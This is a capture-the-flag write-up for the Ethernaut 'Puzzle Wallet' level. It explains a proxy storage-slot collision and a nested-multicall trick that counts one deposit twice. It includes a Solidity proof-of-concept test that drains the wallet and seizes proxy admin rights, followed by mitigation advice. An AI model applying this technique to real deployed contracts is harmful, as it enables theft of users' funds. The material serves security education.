# Level 24 - Puzzle Wallet

## Objectives

- Hijack wallet to become the admin of the proxy.

## Contract Overview

The `PuzzleProxy` contract is a contract that acts as a proxy for another contract, known as the implementation contract. This allows for the upgrading of the implementation contract without affecting the contract's storage or address.

The `PuzzleWallet` contract is a contract that allows for the deposit, withdrawal, and execution of Ether transactions.

## Upgradeable Contracts

In Ethereum, every transaction is unchangeable and cannot be altered, providing a secure network that allows anyone to verify and validate transactions. However, this poses a challenge for developers who need to update their contract's code as it cannot be changed once deployed on the blockchain.

To address this issue, upgradeable contracts were introduced, which consist of two contracts - a Proxy contract (Storage layer) and an Implementation contract (Logic layer).

Under this architecture, users interact with the logic contract via the proxy contract. When there is a need to update the logic contract's code, the address of the logic contract is updated in the proxy contract, enabling users to interact with the new logic contract.

## Finding the weak spots

When implementing an upgradeable pattern, it is important to note that the slot arrangement in both contracts must be identical, as the slots are mapped. This means that when the proxy contract calls the implementation contract, the storage variables in the proxy are modified, and the call is made in the context of the proxy. This is where exploitation can occur.

Let's examine the slot arrangement in both contracts.

| Slot | PuzzleProxy  | PuzzleWallet |
| ---- | ------------ | ------------ |
| 0    | pendingAdmin | owner        |
| 1    | admin        | maxBalance   |

To become the admin of the proxy, we must overwrite the value in slot 1, which is either the `admin` or the `maxBalance` variable.

There are two functions that modify the value of `maxBalance`. They are:

```solidity
    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }
```

The first function is called `init` and is `public`. It takes in a parameter `_maxBalance` and sets the `maxBalance` variable to its value, as long as `maxBalance` is currently equal to 0. This is impossible, so we'll look at the other function `setMaxBalance()`.

The second function is called `setMaxBalance` and is external. It can only be called by an address that has been whitelisted. It sets the `maxBalance` variable to the new value passed in as `_maxBalance`, as long as the contract balance is currently equal to 0.

The `setMaxBalance()` function includes a modifier called `onlyWhitelisted`, which ensures that the user calling the function has been whitelisted. To become whitelisted, we need to call the `addToWhitelist()` function with our wallet's address. However, this function includes a validation check that ensures the `msg.sender` is the owner.

To become the owner, we must write into slot 0, which is either the `owner` or `pendingAdmin` variable. The `proposeNewAdmin()` function in the `PuzzleProxy` contract is external and sets the value for `pendingAdmin`. Since the slots are replicated, calling this function will make us the owner of the `PuzzleWallet` contract because both variables are stored in slot 0 of the contracts.

As we mentioned to call `setMaxBalance` we have to call it by an address that has been whitelisted (we can pass this condition as mentioned above) and the contract balance has to be equal to 0.

Now, let's examine the function that affects the contract's balance and enables us to drain the balance.

```solidity
    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }
```

The issue arises from the fact that the `execute` function will solely utilize the user's balance if it matches the `msg.sender`, and there's no conceivable method for us to manipulate this mechanism. We need to trick the contract into believing that we possess a greater balance than we actually possess.

Now, we must search for any function that modifies our balance values. We observe that the `deposit` function permits a user to add an amount to the contract, but we cannot depend on deposit because even if we add something and subsequently call execute, we can't utilize more than what we've added. Now, there's a function named `multicall`.

```solidity
    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
```

This function essentially performs the action indicated by its name. It permits the calling of a function multiple times within a single transaction, thereby saving gas. Additionally, it includes a check to allow only one deposit within the batched calls. This check is necessary to prevent someone from adding more than one deposit while sending some ether. Without this check, one could potentially double-count the ether sent. So, how can we exploit this?

We can instead of directly calling `deposit` within `multicall` invoke two multicalls and within each `multicall`, we can execute one `deposit`, This approach wouldn't impact `depositCalled`, as each `multicall` would verify its own `depositCalled` boolean value.

After that we can call `execute` function to drain the contract and subsequently, we should be able to invoke `setMaxBalance` to establish the value of `maxBalance` in slot 1, thereby defining the value for the proxy `admin`.

## Potential attack scenario (hypothesis)

An attacker identifies the `PuzzleWallet` contract and recognizes an opportunity to exploit its functionality. The attacker initiates the attack by invoking the `proposeNewAdmin()` function, aiming to gain ownership of the `PuzzleWallet` contract. Subsequently, the attacker proceeds to whitelist their address by calling the `addToWhitelist()` function, ensuring their inclusion in the whitelist.

Leveraging the `multicall()` function, the attacker crafts a batched call payload intended to deposit an amount of ether exceeding their actual balance. The attacker executes the batched call, resulting in the deposit of ether beyond their balance into the `PuzzleWallet` contract.

Seizing the opportunity, the attacker drains the contract balance by invoking the `execute()` function, draining the available ether from the contract. With the contract balance emptied, the attacker capitalizes on their enhanced privileges by invoking the `setMaxBalance()` function, effectively assuming control as the `admin` of the `PuzzleProxy` contract.

## Plan of the attack and calculations

1. Attacker calls `proposeNewAdmin()` function to become owner of `PuzzleWallet` contract.
2. Attacker calls `addToWhitelist()` to whitelist his address.
3. Attacker batches call payload using `multicall()` function to deposit more ether than he has.
4. Attacker drains the contract balance by calling `execute()`.
5. Attacker calls `setMaxBalance()` to become the `admin` of the `PuzzleProxy`.

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/24-PuzzleWallet.t.sol))

```solidity
        emit log_string(
            "--------------------------------------------------------------------------"
        );

        emit log_named_address("Attacker address", player);

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        emit log_named_address("Admin address before attack", level.admin());

        emit log_named_address(
            "Owner address before attack",
            puzzleWallet.owner()
        );

        emit log_named_address(
            "Pending admin address before attack",
             level.pendingAdmin()
        );

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        // 1. Attacker calls `proposeNewAdmin()` function to become owner of `PuzzleWallet` contract.
        level.proposeNewAdmin(player);

        emit log_named_address(
            "Pending admin address after first attack",
             level.pendingAdmin()
        );

        emit log_named_address(
            "Owner address after first attack",
            puzzleWallet.owner()
        );

        emit log_named_address(
            "Admin address after first attack",
            level.admin()
        );

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        // 2. Attacker calls `addToWhitelist()` to whitelist his address.
        puzzleWallet.addToWhitelist(player);

        emit log_named_uint(
            "Balance of contract before second attack",
            address(puzzleWallet).balance
        );

        // 3. Attacker batches call payload using `multicall()` function to deposit more ether than he has.
        bytes[] memory dataArraySecondCall = new bytes[](1);
        dataArraySecondCall[0] = abi.encodeWithSelector(
            puzzleWallet.deposit.selector
        );

        bytes[] memory dataArray = new bytes[](2);

        dataArray[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);
        dataArray[1] = abi.encodeWithSelector(
            puzzleWallet.multicall.selector,
            dataArraySecondCall
        );
        puzzleWallet.multicall{value: 0.001 ether}(dataArray);

        // 4. Attacker drains the contract balance by calling `execute()`.

        puzzleWallet.execute(player, address(puzzleWallet).balance, "");

        emit log_named_uint(
            "Balance of contract after second attack",
            address(puzzleWallet).balance
        );

        // 5. Attacker calls `setMaxBalance()` to become the `admin` of the `PuzzleProxy`.
        puzzleWallet.setMaxBalance(uint256(uint160(address(player))));

        emit log_named_address("Admin address after attack", level.admin());

        // Test assertion
        assertEq(level.admin(), player);

```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/PuzzleWallet.png)

## Recommendations

- Always apply appropriate access control modifiers to business-critical functions to restrict unauthorized access. Never leave critical functions accessible to unintended users.

- Ensure that the slot arrangement is consistent across both the proxy and implementation contracts. Inconsistent slot arrangements may lead to vulnerabilities where variables on the same slots can be overwritten inadvertently, compromising contract integrity.

- Implement thorough input validations and security checks in functions related to balance updates, Ether deposits, and withdrawals. These functions should validate all input parameters to prevent unexpected behaviors and mitigate potential exploits. Ensure that critical functions dependent on the contract's balance are robustly implemented to withstand potential attacks.

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [Blog Stermi](https://stermi.xyz/blog/ethernaut-challenge-20-solution-shop)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Smart Contract Programmer YT - Ethernaut](https://www.youtube.com/playlist?list=PLO5VPQH6OWdWh5ehvlkFX-H3gRObKvSL6)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
